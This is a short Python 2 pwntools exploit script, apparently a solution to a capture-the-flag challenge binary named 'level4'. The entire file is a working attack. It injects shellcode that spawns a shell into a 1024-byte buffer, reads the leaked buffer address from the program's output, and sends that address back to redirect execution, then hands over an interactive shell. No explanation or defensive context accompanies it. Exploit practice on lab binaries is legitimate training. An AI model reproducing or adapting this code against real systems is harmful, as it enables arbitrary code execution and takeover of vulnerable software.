#!/usr/bin/env python2
from pwn import *
context.arch = "amd64"

elf = ELF("./level4")

def loc():
    return process("./level4")

def rem():
    return remote("127.0.0.1", 10004)

buffer_size = 1024
shellcode = (asm(shellcraft.sh())).ljust(buffer_size, "A")

r = loc()
r.recvuntil("?")
r.send(shellcode)
r.recvuntil(shellcode)

delimeter = "\nWhere"
data = r.recvuntil(delimeter)
data = data[: data.find(delimeter)]
data = data.ljust(8, "\x00")
buffer = u64(data)

print "buffer: %s" % hex(buffer)

r.recv(1024)
r.send("%lx" % (buffer))
r.interactive()